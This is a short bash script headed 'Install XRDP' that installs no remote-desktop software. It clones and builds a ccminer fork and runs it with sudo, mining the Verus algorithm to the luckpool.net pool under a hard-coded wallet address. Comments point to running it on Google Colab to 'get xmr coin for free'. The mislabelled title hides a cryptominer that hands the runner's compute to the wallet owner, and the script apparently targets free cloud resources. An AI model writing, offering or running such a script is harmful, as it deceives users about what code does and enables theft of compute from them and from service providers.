#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt install wget build-essential checkinstall
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential

sudo apt update
clear
sudo apt install git screen -y
screen -R vrot

git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer
chmod +x build.sh

chmod +x configure.sh

chmod +x autogen.sh

./build.sh
sudo ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RL5Bce95KspuxP8carp47NU3fBnZ2cpbnT.Rig001 -p x -t 20
